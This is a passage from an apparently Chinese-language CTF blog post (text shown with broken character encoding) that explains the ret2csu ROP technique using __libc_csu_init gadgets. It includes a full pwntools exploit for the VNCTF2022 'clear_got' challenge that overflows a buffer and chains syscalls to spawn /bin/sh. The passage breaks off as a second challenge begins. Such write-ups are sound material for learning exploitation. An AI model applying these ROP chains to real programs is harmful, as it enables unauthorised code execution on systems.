8</span><br><span class="line">.text:000000000040059A                 pop     rbx</span><br><span class="line">.text:000000000040059B                 pop     rbp</span><br><span class="line">.text:000000000040059C                 pop     r12</span><br><span class="line">.text:000000000040059E                 pop     r13</span><br><span class="line">.text:00000000004005A0                 pop     r14</span><br><span class="line">.text:00000000004005A2                 pop     r15</span><br><span class="line">.text:00000000004005A4                 retn</span><br><span class="line">.text:00000000004005A4 ; &#125; // starts at 400540</span><br><span class="line">.text:00000000004005A4 __libc_csu_init endp</span><br></pre></td></tr></table></figure><h2 id="å¦‚ä½•åˆ©ç”¨csuè¿™éƒ¨åˆ†ä»£ç ï¼Ÿ"><a href="#å¦‚ä½•åˆ©ç”¨csuè¿™éƒ¨åˆ†ä»£ç ï¼Ÿ" class="headerlink" title="å¦‚ä½•åˆ©ç”¨csuè¿™éƒ¨åˆ†ä»£ç ï¼Ÿ"></a>å¦‚ä½•åˆ©ç”¨csuè¿™éƒ¨åˆ†ä»£ç ï¼Ÿ</h2><p><img src="/../img/2706180-20220218171725002-1163274691.png"></p><p>æˆ‘ä»¬åˆ©ç”¨çš„å…¶å®å°±æ˜¯è¿™ä¸¤éƒ¨åˆ†çš„ä»£ç ï¼Œæˆ‘ä»¬ç»™è¿™ä¸¤æ®µèµ·ä¸ªåå­—ï¼Œä¸Šé¢çš„éƒ¨åˆ†å«gadget2ï¼Œä¸‹é¢çš„éƒ¨åˆ†å«gadget1ï¼ˆå› ä¸ºæˆ‘ä»¬å…ˆæ‰§è¡Œä¸‹é¢çš„éƒ¨åˆ†ï¼Œå› æ­¤å°±å«ä¸‹é¢çš„gadget1å§ï¼‰</p><p>å‡è®¾æˆ‘ä»¬ç°åœ¨é€šè¿‡æº¢å‡ºï¼Œå·²ç»å¯ä»¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµäº†ï¼Œæˆ‘ä»¬æ­¤æ—¶å°±æŠŠè¿”å›åœ°å€å¡«å†™æˆgadget1çš„åœ°å€0x40059Aï¼ˆå› ä¸ºæˆ‘ä»¬å¹¶ä¸éœ€è¦add rsp,8è¿™ä¸ªæŒ‡ä»¤ï¼Œå› æ­¤ç›´æ¥ä»0x40059Aå¼€å§‹å³å¯ï¼‰</p><p>ç°åœ¨å°±ä¼šæŠŠæ ˆä¸­çš„å‰6ä¸ªæ•°æ®åˆ†åˆ«å¼¹ç»™rbx,rbp,r12,r13,r14,r15è¿™å…­ä¸ªå¯„å­˜å™¨ã€‚</p><p>æˆ‘ä»¬é€šå¸¸ä¼šæŠŠrbxçš„å€¼è®¾ç½®æˆ0ï¼Œè€Œrbpè®¾ç½®æˆ1.è¿™æ ·çš„ç›®çš„æ˜¯åœ¨æ‰§è¡Œcall    qword ptr [r12+rbx*8]è¿™ä¸ªæŒ‡ä»¤çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä»…ä»…æŠŠr12çš„å€¼ç»™è®¾ç½®æˆæŒ‡å‘æˆ‘ä»¬æƒ³callåœ°å€çš„åœ°å€å³å¯ï¼Œä»è€Œä¸ç”¨ç®¡rbxã€‚</p><p>åˆå› ä¸ºè¿™ä¸‰ä¸ªæŒ‡ä»¤add     rbx,ï¼›cmp     rbx, rbpï¼›jnz     short loc_400580ï¼Œjnzæ˜¯ä¸ç›¸ç­‰æ—¶è·³è½¬ï¼Œæˆ‘ä»¬é€šå¸¸å¹¶ä¸æƒ³è·³è½¬åˆ°0x400580è¿™ä¸ªåœ°æ–¹ï¼Œå› ä¸ºæ­¤åˆ»æ‰§è¡Œè¿™ä¸‰ä¸ªæŒ‡ä»¤çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±æ˜¯ä»0x400580è¿™ä¸ªåœ°å€è¿‡æ¥çš„ã€‚å› æ­¤rbxåŠ ä¸€ä¹‹åï¼Œæˆ‘ä»¬è¦è®©å®ƒå’Œrbpç›¸ç­‰ï¼Œå› æ­¤rbpå°±è¦æå‰è¢«è®¾ç½®æˆ1.</p><p>ç„¶år12è¦å­˜æ”¾çš„å°±æ˜¯æŒ‡å‘ï¼ˆæˆ‘ä»¬è¦è·³è½¬åˆ°é‚£ä¸ªåœ°å€ï¼‰çš„åœ°å€ã€‚è¿™é‡Œæœ‰ä¸ªå¾ˆé‡è¦çš„å°æŠ€å·§ï¼Œå¦‚æœä½ ä¸æƒ³ä½¿ç”¨è¿™ä¸ªcallï¼Œæˆ–è€…è¯´ä½ æƒ³callä¸€ä¸ªå‡½æ•°ï¼Œä½†æ˜¯ä½ æ‹¿ä¸åˆ°å®ƒçš„gotåœ°å€ï¼Œå› æ­¤æ²¡æ³•ä½¿ç”¨è¿™ä¸ªcallï¼Œé‚£å°±å»callä¸€ä¸ªç©ºå‡½æ•°ï¼ˆ_term_procå‡½æ•°ï¼‰ï¼ˆå¹¶ä¸”è¦æ³¨æ„çš„æ˜¯ï¼Œr12çš„åœ°å€å¡«å†™çš„å¹¶ä¸æ˜¯_term_procçš„åœ°å€ï¼Œè€Œæ˜¯æŒ‡å‘è¿™ä¸ªå‡½æ•°çš„åœ°å€ï¼‰ã€‚</p><p>ç„¶år13,r14,r15è¿™ä¸‰ä¸ªå€¼åˆ†åˆ«å¯¹åº”äº†rdx,rsi,ediã€‚è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œr15æœ€åä¼ ç»™çš„æ˜¯edi,æœ€årdiçš„é«˜å››å­—èŠ‚éƒ½æ˜¯00ï¼Œè€Œä½å››å­—èŠ‚æ‰æ˜¯r15é‡Œçš„å†…å®¹ã€‚ï¼ˆä¹Ÿå°±æ˜¯è¯´å¦‚æœæƒ³ç”¨ret2csuå»æŠŠrdié‡Œå­˜æ”¾æˆä¸€ä¸ªåœ°å€æ˜¯ä¸å¯è¡Œçš„ï¼‰</p><p>æ¥ç€åˆ°äº†gadget1çš„ç»“å°¾retè¿™é‡Œï¼Œç„¶åæˆ‘ä»¬ç´§æ¥ç€å†™å…¥gadget2çš„åœ°å€0x400580ã€‚<br><img src="/../img/2706180-20220218171748437-1273885946.png"></p><p>æ­¤æ—¶å¼€å§‹æ‰§è¡Œè¿™éƒ¨åˆ†ä»£ç ï¼Œè¿™æ²¡ä»€ä¹ˆå¥½è¯´çš„äº†ï¼Œå°±æ˜¯æŠŠr13,r14,r15çš„å€¼æ”¾å…¥rdx,rsi,ediä¸‰ä¸ªå¯„å­˜å™¨é‡Œé¢ã€‚</p><p>ç„¶åç”±äºæˆ‘ä»¬å‰é¢çš„rbxæ˜¯0ï¼ŒåŠ ä¸€ä¹‹åç­‰äºäº†rbpï¼Œå› æ­¤jnzä¸è·³è½¬ã€‚é‚£å°±ç»§ç»­å‘ä¸‹æ‰§è¡Œï¼Œå¦‚æœæˆ‘ä»¬ä¸Šé¢calläº†ä¸€ä¸ªç©ºå‡½æ•°çš„è¯ï¼Œé‚£æˆ‘ä»¬å°±åˆ©ç”¨ä¸‹é¢çš„retã€‚ç”±äºç»§ç»­å‘ä¸‹æ‰§è¡Œï¼Œå› æ­¤åˆæ¥åˆ°äº†gadget1è¿™é‡Œã€‚</p><p><img src="/../img/2706180-20220218171758126-1557535385.png"></p><p>å¦‚æœä¸éœ€è¦å†ä¸€æ¬¡æ§åˆ¶å‚æ•°çš„è¯ï¼Œé‚£æˆ‘ä»¬æ­¤æ—¶æŠŠæ ˆä¸­çš„æ•°æ®å¡«å……56ï¼ˆ7*8ä½ æ‡‚å¾—ï¼‰ä¸ªåƒåœ¾æ•°æ®å³å¯ã€‚</p><p>å¦‚æœæˆ‘ä»¬è¿˜éœ€è¦ç»§ç»­æ§åˆ¶å‚æ•°çš„è¯ï¼Œé‚£å°±æ­¤æ—¶ä¸å¡«å……åƒåœ¾æ•°æ®ï¼Œç»§ç»­å»æ§åˆ¶å‚æ•°ï¼Œæ€»ä¹‹ä¸ç®¡å¹²å•¥å‘¢ï¼Œè¿™é‡Œéƒ½è¦å‡‘é½56å­—èŠ‚çš„æ•°æ®ï¼Œä»¥ä¾¿æˆ‘ä»¬æ‰§è¡Œæœ€åçš„retï¼Œæœ€åretå»æ‰§è¡Œæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‡½æ•°å³å¯ã€‚</p><h3 id="é”™ä½è·å–pop-rsi-pop-rdi"><a href="#é”™ä½è·å–pop-rsi-pop-rdi" class="headerlink" title="é”™ä½è·å–pop rsi;pop rdi"></a>é”™ä½è·å–pop rsi;pop rdi</h3><p>å¦‚æœåªæ˜¯è¦å•çº¯æ§åˆ¶pop rsiå’Œpop rdiå¯„å­˜å™¨çš„è¯ï¼Œå¯ä»¥ä¸ç”¨ret2csuï¼Œç›´æ¥æœçš„ã€‚å› ä¸ºpop r14å’Œpop r15ï¼ˆè¿™ä¸¤ä¸ªgadgetå­˜åœ¨äº__libc_csu_init)å¯¹åº”çš„æœºå™¨ç åˆ†åˆ«ä¸º</p><p><img src="/../img/2706180-20220416083231234-1556484483.png"></p><p>ï¼ˆæ±‡ç¼–å¦‚ä½•çœ‹å¯¹åº”çš„æœºå™¨ç ï¼Œæˆ‘åœ¨shellcodeé‚£ä¸€ç¯‡åšå®¢ä¸­å·²ç»è®²è¿‡äº†ï¼‰å¯ä»¥å‘ç°pop rsiå’Œpop rdiåˆ†åˆ«å­˜åœ¨äºpop r14å’Œpop r15çš„æœºå™¨ç ä¸­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨é”™ä½æ¥å¾—åˆ°ä»–ä»¬ã€‚ç”¨Ropgadgetç›´æ¥æœpop rsiæˆ–æ˜¯æœå®ƒçš„æœºå™¨ç 5eï¼Œå°±ä¼šå‡ºæ¥é”™ä½å¾—åˆ°çš„åœ°å€ã€‚(æ–¹æ³•å¦‚ä¸‹)ä¸è¿‡æ²¡æœ‰åŠæ³•é€šè¿‡é”™ä½æ¥å¾—åˆ°pop rdxã€‚</p><p><img src="/../img/2706180-20220416083243224-1368780037.png"></p><h2 id="ret2csuç›¸å…³é¢˜ç›®"><a href="#ret2csuç›¸å…³é¢˜ç›®" class="headerlink" title="ret2csuç›¸å…³é¢˜ç›®"></a>ret2csuç›¸å…³é¢˜ç›®</h2><p>ä¸‹é¢æ˜¯æˆ‘åšè¿‡ä¸‰é“å…³äºret2csuçš„é¢˜ç›®ï¼Œé™„ä¸ŠWP</p><h3 id="VNCTF2022å…¬å¼€èµ›clear-got"><a href="#VNCTF2022å…¬å¼€èµ›clear-got" class="headerlink" title="VNCTF2022å…¬å¼€èµ›clear_got"></a>VNCTF2022å…¬å¼€èµ›clear_got</h3><p>åšè¿™é“é¢˜ï¼Œå¿…é¡»å…ˆæŒæ¡ä¸‹é¢è¿™ä¸‰ä¸ªç‚¹ã€‚</p><p>1ã€é¦–å…ˆæ˜¯callæŒ‡ä»¤åé¢çš„è¿™ä¸ªåœ°å€ï¼ˆå¦‚æœæ˜¯å‡½æ•°åå°±ä¸è¯´äº†ï¼‰ï¼Œå°±æ¯”å¦‚ç°åœ¨ret2csuä¸­ï¼Œå‡†å¤‡æ‰§è¡Œè¿™ä¸ª</p><p><img src="/../img/2706180-20220218171949096-1693789079.png"></p><p>æˆ‘ä»¬è®©rbxä¸º0ï¼Œæ­¤æ—¶call r12ï¼Œé‚£æ€ä¹ˆæ‰èƒ½callæˆåŠŸå‘¢ï¼ŒåŸæœ¬çœ‹åˆ°å¸ˆå‚…ä»¬è¯´æ˜¯è¦è£…gotåœ°å€ï¼Œåæ¥å‘ç°è£…ä¸€ä¸ªåœ°å€ï¼ˆè¿™ä¸ªåœ°å€æ˜¯è¢«å¦ä¸€ä¸ªåœ°å€æ‰€æŒ‡å‘çš„ï¼‰ï¼Œç„¶åæŠŠr12å¡«å†™æˆå¦ä¸€ä¸ªåœ°å€ï¼Œä¹Ÿå¯ä»¥callæˆåŠŸï¼Œå†å›æƒ³ä¸€ä¸‹ä¸ºä»€ä¹ˆè¦è£…gotåœ°å€ï¼Œè€Œä¸æ˜¯pltåœ°å€ï¼ŒåŸå› ä¹Ÿæ˜¯å‡ºç°åœ¨äº†gotåœ°å€ä»…ä»…ä¼šè·³è½¬ä¸€æ¬¡ï¼Œä¹Ÿå°±æ˜¯è¯´å¡«ä¸€ä¸ªgotåœ°å€ï¼Œä¹Ÿæ˜¯ä¼šä»è¿™ä¸ªåœ°å€å»è·³åˆ°gotåœ°å€æ‰€æŒ‡å‘çš„åœ°å€ï¼ˆä¹Ÿå°±æ˜¯çœŸå®åœ°å€ï¼ˆå› ä¸ºå»¶è¿Ÿç»‘å®šçš„åŸå› ï¼Œå¦‚æœä¸æ¸…æ¥šçš„è¯ï¼Œè¿™é‡Œè¯·è‡ªè¡Œç™¾åº¦ä¸€ä¸‹å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼‰ï¼‰ï¼Œå› æ­¤ç»“è®ºå°±å‡ºæ¥äº†ï¼Œè¦æƒ³å»callå»è·³è½¬åˆ°ä¸€ä¸ªåœ°å€Aï¼Œé‚£å°±å¿…é¡»ç”¨ä¸€ä¸ªæŒ‡å‘åœ°å€Açš„åœ°å€Bæ”¾åˆ°callåé¢ã€‚</p><p>2ã€å¦‚æœæˆ‘ä»¬ä»…ä»…æ˜¯æƒ³åˆ©ç”¨ret2csuå»æ§åˆ¶å‚æ•°ï¼Œè€Œå¹¶ä¸æƒ³å»ç”¨callæ‰§è¡Œï¼Œæˆ–è€…è¯´æ˜¯ä½ æƒ³ç”¨callæ‰§è¡Œè·³è½¬ï¼Œä½†æ˜¯ä½ æ‰¾ä¸åˆ°å»æŒ‡å‘ä½ æƒ³è·³è½¬çš„é‚£ä¸ªåœ°å€ï¼Œå› æ­¤æˆ‘ä»¬ç”¨æœ€åçš„retè·³è½¬ï¼ˆä½ æƒ³è·³è½¬åˆ°å“ªé‡Œï¼Œå°±å¡«å“ªçš„åœ°å€å³å¯ï¼‰ã€‚é‚£æ€ä¹ˆæŠŠcallçš„é‚£ä¸€æ­¥å¿½ç•¥å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥callä¸€ä¸ªç©ºå‡½æ•°ï¼ˆä¸éœ€è¦å‚æ•°ï¼Œæ‰§è¡Œä¹‹åä¹Ÿä¸ä¼šå¯¹ç¨‹åºæœ¬èº«é€ æˆä»»ä½•å½±å“çš„å‡½æ•°ï¼‰ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯_term_procï¼ˆæ³¨æ„ï¼Œè¿™é‡Œcallçš„æ˜¯æŒ‡å‘_term_procçš„åœ°å€ï¼Œè€Œéterm_procçš„åœ°å€</p><p><img src="/../img/2706180-20220218171956921-899601017.png"></p><p>3ã€æ€ä¹ˆå»ä¿®æ”¹raxçš„å€¼ï¼Ÿ</p><p>è¿™é‡Œæåˆ°äº†ä¸€ç§å¾ˆå·§å¦™çš„æ–¹æ³•ã€‚æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹readå‡½æ•°å’Œwriteå‡½æ•°çš„è¿”å›å€¼ã€‚</p><p><img src="/../img/2706180-20220218172005653-329466746.png"></p><p>å›¾ç‰‡å‡ºè‡ª(25æ¡æ¶ˆæ¯) readçš„è¿”å›å€¼å–ä¿é™©çš„ç å†œçš„åšå®¢-CSDNåšå®¢readå‡½æ•°è¿”å›å€¼</p><p>readå’Œwriteå‡½æ•° - æ•…äº‹ï¼Œ - åšå®¢å›­ (cnblogs.com)</p><p>æˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ¥readå‡½æ•°å’Œwriteå‡½æ•°æœ€åçš„è¿”å›å€¼éƒ½æ˜¯å®é™…è¯»åˆ°å’Œå†™å…¥çš„å­—èŠ‚æ•°ï¼ˆå¦‚æœæ‰§è¡ŒæˆåŠŸçš„è¯ï¼‰ï¼Œè€Œè¿”å›å€¼æœ€åå°±ä¼šæ”¾åˆ°raxé‡Œé¢ã€‚ä¹Ÿå°±æ˜¯è¯´å¯ä»¥åˆ©ç”¨readå’Œwriteå»æ§åˆ¶æˆ‘ä»¬æƒ³è¦çš„raxã€‚ï¼ˆä¸ºå•¥è¦æ§åˆ¶raxï¼Ÿæ·¦ï¼Œä½ åªè¦çŸ¥é“è¿™ä¸ªæ§åˆ¶raxçš„æ–¹æ³•å°±è¡Œäº†ï¼Œéœ€è¦çš„æ—¶å€™å°±èƒ½ç”¨åˆ°ï¼Œå°±æ¯”å¦‚è¿™é“é¢˜ï¼‰</p><p>æŒæ¡ä¸Šè¿°ä¸‰ç‚¹ä¹‹åï¼Œå°±å¯ä»¥æ¥åšé¢˜äº†ã€‚</p><p><img src="/../img/2706180-20220218172017865-1429417700.png"></p><p><img src="/../img/2706180-20220218172033310-262577355.png"></p><p>å‘ç°ä¸»å‡½æ•°å¾ˆç®€å•ï¼Œbufä¹Ÿæ˜¯å­˜åœ¨æº¢å‡ºï¼Œæ„å‘³ç€æˆ‘ä»¬å¯ä»¥æ§åˆ¶è¿”å›åœ°å€ã€‚</p><p><img src="/../img/2706180-20220218172041135-1398354103.png"></p><p>æ²¡æœ‰å‘ç°åé—¨å‡½æ•°å’Œå‚æ•°ï¼Œä½†æ˜¯å‘ç°æœ‰ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œè¿™é‡Œå¾ˆå¯ç–‘ï¼Œç•™æ„ä¸€ä¸‹ã€‚</p><p>è¿™é“é¢˜çš„å›°éš¾ç‚¹å…¶å®åœ¨è¿™é‡Œ<br><img src="/../img/2706180-20220218172048110-1930281658.png"></p><p>Memsetæ¸…ç©ºäº†0x601008å¾€ä¸‹é¢çš„0x38ä¸ªå­—èŠ‚çš„å†…å®¹ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹0x601008æ˜¯ä»€ä¹ˆ<br><img src="/../img/2706180-20220218172054303-1345094970.png"></p><p>å‘ç°å±…ç„¶æ˜¯gotè¡¨ï¼Œgotè¡¨è¢«æ¸…ç©ºäº†æ„å‘³ç€ä»€ä¹ˆï¼Œ1ã€æˆ‘ä»¬ä¹‹å‰å·²ç»å®Œæˆå»¶è¿Ÿç»‘å®šçš„å‡½æ•°çš„çœŸå®åœ°å€å·²ç»ä¸åœ¨gotè¡¨äº†ã€‚2ã€æœ€å¼€å§‹ï¼ˆæ‰§è¡Œå»¶è¿Ÿç»‘å®šä¹‹å‰ï¼‰gotè¡¨åŸæœ¬è·³å¾€externçš„åœ°å€ï¼Œå˜æˆäº†0ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´æ‰§è¡Œäº†è¿™ä¸ªmemsetä¹‹åï¼Œæˆ‘ä»¬åœ¨gotè¡¨ä¸­çš„æ‰€æœ‰å‡½æ•°éƒ½æ²¡æ³•å†è¢«ä½¿ç”¨äº†ã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬èƒ½ç”¨çš„æœ‰ä»€ä¹ˆï¼Ÿåªå‰©ä¸‹äº†ç³»ç»Ÿè°ƒç”¨ï¼Œå¯æ˜¯æƒ³ç”¨ç³»ç»Ÿè°ƒç”¨æ‰§è¡Œexecve(â€˜&#x2F;bin&#x2F;shâ€™,0,0)ï¼Œæˆ‘ä»¬éœ€è¦åšåˆ°ä¸‰ä»¶äº‹ï¼Œç¬¬ä¸€æ˜¯æ§åˆ¶raxï¼Œç¬¬äºŒæ˜¯æ§åˆ¶rdi,rsi,rdxè¿™ä¸‰ä¸ªå¯„å­˜å™¨ï¼Œç¬¬ä¸‰æ˜¯å°†&#x2F;bin&#x2F;shå†™å…¥åˆ°bssæ®µã€‚</p><p>æ§åˆ¶raxï¼Ÿï¼Œæœ‰æ²¡æœ‰æƒ³åˆ°æœ€å¼€å§‹æåˆ°çš„é‚£ä¸ªæ–¹æ³•ï¼Œåˆ©ç”¨readæˆ–è€…writeå»ä¿®æ”¹raxã€‚ç”±äºæˆ‘ä»¬è¿˜è¦å†™å…¥&#x2F;bin&#x2F;shï¼Œå› æ­¤æˆ‘ä»¬è¿™é‡Œé‡‡ç”¨ç³»ç»Ÿè°ƒç”¨readï¼Œå¯æ˜¯readçš„ç³»ç»Ÿè°ƒç”¨å·æ˜¯0ï¼Œè€Œç¨‹åºä¸­å‡ºç°çš„ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨æ²¡æœ‰readï¼Œæ€ä¹ˆåŠï¼Ÿå…¶å®ä¸ç”¨ç®¡çš„ï¼Œå› ä¸ºmainå‡½æ•°çš„è¿”å›å€¼æ˜¯0ï¼Œåœ¨mainå‡½æ•°çš„retä¹‹å‰ï¼Œå°±æŠŠraxçš„å€¼ç»™è®¾æˆ0äº†ï¼Œå› æ­¤æˆ‘ä»¬æº¢å‡ºä¹‹åï¼Œå§‹ç»ˆraxéƒ½æ˜¯0ï¼ˆåœ¨æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ä¹‹å‰ï¼‰ã€‚</p><p>æ—¢ç„¶ç°åœ¨å¯ä»¥ç³»ç»Ÿè°ƒç”¨readï¼Œé‚£åªéœ€è¦æ§åˆ¶å‚æ•°ï¼Œå°†&#x2F;bin&#x2F;shå†™å…¥bssæ®µå³å¯ï¼Œæ€ä¹ˆæ§åˆ¶å‚æ•°ï¼Ÿç”¨Ropgadgetæœç´¢ä¹‹åå‘ç°ï¼Œæ²¡æœ‰èƒ½æ§åˆ¶rsiå’Œrdxçš„å¯„å­˜å™¨ï¼Œå› æ­¤åªèƒ½é‡‡ç”¨ret2csuçš„æ–¹æ³•ã€‚</p><p>æœ€åæœ‰ä¸¤ç‚¹è¦æ³¨æ„</p><p>ç¬¬ä¸€ï¼Œ  æˆ‘ä»¬ç³»ç»Ÿè°ƒç”¨äº†ä¸€æ¬¡è¾“å…¥ï¼Œåœ¨è¿™æ¬¡è¾“å…¥é‡Œï¼Œå¿…é¡»å¡«å……åˆ°59ä¸ªå­—èŠ‚</p><p>ç¬¬äºŒï¼Œ  ç”±äºç¬¬ä¸€æ¬¡è¾“å…¥æœ€å¤šåªèƒ½è¾“å…¥0x100ä¸ªå­—èŠ‚ï¼Œå› æ­¤æˆ‘ä»¬æ˜¯æ²¡æ³•éšå¿ƒæ‰€æ¬²æ„é€ gadgetsçš„ï¼Œè¦è€ƒè™‘é•¿åº¦é™åˆ¶ï¼Œå› ä¸ºå…‰åƒåœ¾æ•°æ®éƒ½å¡«å……äº†0x68ä¸ªå­—èŠ‚ã€‚å› æ­¤éœ€è¦è€ƒè™‘ä¸¤ç‚¹ï¼Œç¬¬ä¸€ç‚¹ï¼Œæˆ‘ä»¬ä¸¤æ¬¡ç³»ç»Ÿè°ƒç”¨ï¼ˆç¬¬ä¸€æ¬¡è°ƒç”¨readç¬¬äºŒæ¬¡è°ƒç”¨systemï¼‰ï¼Œç¬¬äºŒæ¬¡å¦‚æœå†ç”¨retå»è¿”å›åˆ°ç³»ç»Ÿè°ƒç”¨ï¼Œå­—èŠ‚æ˜¯è¶…äº†çš„ï¼Œå› æ­¤æˆ‘ä»¬ç¬¬ä¸€æ¬¡retè¿›è¡Œä¸€ä¸‹ç³»ç»Ÿè°ƒç”¨ï¼Œç„¶åå†ret2csuï¼Œè¿™ä¸€æ¬¡åœ¨callçš„æ—¶å€™å°±è¦æƒ³åŠæ³•å»ç³»ç»Ÿè°ƒç”¨ï¼Œå¯æ˜¯æˆ‘ä»¬åœ¨è¿™ä¸ªç¨‹åºé‡Œæ˜¯æ‰¾ä¸åˆ°æŒ‡å‘è¿™ä¸ªåœ°å€çš„åœ°å€ã€‚</p><p><img src="/../img/2706180-20220218172110241-1964520348.png"></p><p>å› æ­¤æˆ‘ä»¬è¿™é‡Œè¦ç”¨ä¸€ä¸ªå·§æ³•ï¼Œåœ¨ç¬¬ä¸€æ¬¡è¾“å…¥çš„æ—¶å€™ï¼ŒæŠŠsyscallçš„è¿™ä¸ªåœ°å€ä¹Ÿç»™å†™åˆ°bssæ®µï¼Œè¿™æ ·bssæ®µçš„åœ°å€å°±æŒ‡å‘äº†syscallã€‚ç¬¬äºŒç‚¹ï¼Œè¿˜æ˜¯è€ƒè™‘åˆ°å­—èŠ‚æ•°çš„é—®é¢˜ï¼Œä¸ºäº†æ„é€ çš„payloadå­—èŠ‚æ›´å°‘ï¼Œæˆ‘ä»¬åœ¨ret2csuç¬¬äºŒæ¬¡æ‰§è¡Œä¸‹é¢çš„ä»£ç çš„æ—¶å€™ï¼Œå°±ä¸å¡«å……æˆåƒåœ¾æ•°æ®ï¼Œç›´æ¥å¡«å†™æˆç¬¬äºŒæ¬¡ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°ï¼ˆå¦‚æœä¸è¿™æ ·çš„è¯ï¼Œpayloadå¤ªé•¿äº†ï¼Œæ²¡æ³•å…¨éƒ¨è¾“å…¥è¿›å»ï¼‰ã€‚</p><p><img src="/../img/2706180-20220218172117760-321400513.png"></p><p>Expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">pop_rdi_addr=<span class="number">0x4007f3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;pid&#x27;</span>+<span class="built_in">str</span>(proc.pidof(p)))</span><br><span class="line">offset=<span class="number">0x60</span></span><br><span class="line">syscall_addr=<span class="number">0x40077E</span></span><br><span class="line">write_addr=<span class="number">0x400773</span></span><br><span class="line">csu_gadget1=<span class="number">0x4007EA</span></span><br><span class="line">csu_gadget2=<span class="number">0x4007D0</span></span><br><span class="line">term_proc=<span class="number">0x600e50</span></span><br><span class="line">bss_addr=<span class="number">0x601060</span></span><br><span class="line">payload=(offset+<span class="number">8</span>)*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p64(csu_gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>) <span class="comment">#rbx</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">payload+=p64(term_proc)<span class="comment">#r12 ç©ºå‡½æ•°#ç¬¬ä¸€æ¬¡ret2csuçš„ç›®çš„æ˜¯ä¼ readå‡½æ•°å‚æ•°ï¼Œå¹¶ä¸”åœ¨æœ€åçš„retå»æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œç¬¬ä¸€æ¬¡ä¸éœ€è¦ç”¨åˆ°callï¼Œå› æ­¤callä¸€ä¸ªç©ºå‡½æ•°</span></span><br><span class="line">payload+=p64(<span class="number">59</span>)<span class="comment">#r13 rdx #æ‰§è¡Œä¸€æ¬¡syscallä¹‹åï¼Œraxå°±å˜æˆäº†0x3b</span></span><br><span class="line">payload+=p64(bss_addr)<span class="comment">#r14  #rsi  #å°†/bin/shå†™å…¥bssæ®µ</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#r15  #rdi</span></span><br><span class="line">payload+=p64(csu_gadget2)</span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span><span class="comment">#ä¸‹é¢çš„48ä¸ªæ•°æ®ä¸ç”¨åƒåœ¾å¡«å……ï¼Œç›´æ¥è¿›è¡Œä¸‹ä¸€è½®æ¶‰åŠå‚æ•°ï¼Œè¿™8ä¸ªåƒåœ¾æ•°æ®å¡«å……çš„æ˜¯add rsp,8</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x8</span>)<span class="comment">#æ­¤æ—¶ç”¨callæ¥æ‰§è¡Œè¾“å…¥åˆ°bssæ®µé‡Œçš„syscall</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(bss_addr)</span><br><span class="line">payload+=p64(syscall_addr)</span><br><span class="line">payload+=p64(csu_gadget2)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Welcome to VNCTF! This is a easy competition.///\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(syscall_addr)+<span class="string">&#x27;\x00&#x27;</span>.ljust(<span class="number">59</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#è¿™é‡Œä¸€å®šè¦å‡‘é½59ï¼Œä½¿å¾—readå‡½æ•°çš„è¿”å›å€¼ï¼Œä¹Ÿå°±æ˜¯è®©raxå˜æˆ59</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="BUUCTFä¸Šçš„ciscn-2019-es-7"><a href="#BUUCTFä¸Šçš„ciscn-2019-es-7" class="headerlink" title="BUUCTFä¸Šçš„ciscn_2019_es_7"></a>BUUCTFä¸Šçš„ciscn_2019_es_7</h3><p><img src="/../img/2706180-20220218171807039-876069338.png"></p><p><img src="/../img/2706180-20220218171817015-1156769220.png"></p><p>å‘ç°ç¨‹åºæµç¨‹å°±æ˜¯ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œä¸€ä¸ªæ˜¯readï¼Œä¸€ä¸ªæ˜¯writeã€‚</p><p><img 